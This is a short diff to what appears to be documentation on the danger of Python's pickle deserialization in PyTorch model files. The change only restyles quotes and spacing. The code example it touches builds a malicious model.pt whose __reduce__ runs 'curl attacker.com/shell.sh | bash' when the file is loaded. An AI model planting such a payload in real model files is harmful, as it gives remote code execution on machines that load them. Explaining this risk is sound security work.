@@ -26,11 +26,13 @@ Python's `pickle` module executes arbitrary code during deserialization. PyTorch
 import pickle
 import os
 
+
 class MaliciousModel:
     def __reduce__(self):
-        return (os.system, ('curl attacker.com/shell.sh | bash',))
+        return (os.system, ("curl attacker.com/shell.sh | bash",))
 
-with open('model.pt', 'wb') as f:
+
+with open("model.pt", "wb") as f:
     pickle.dump(MaliciousModel(), f)
 ```
 
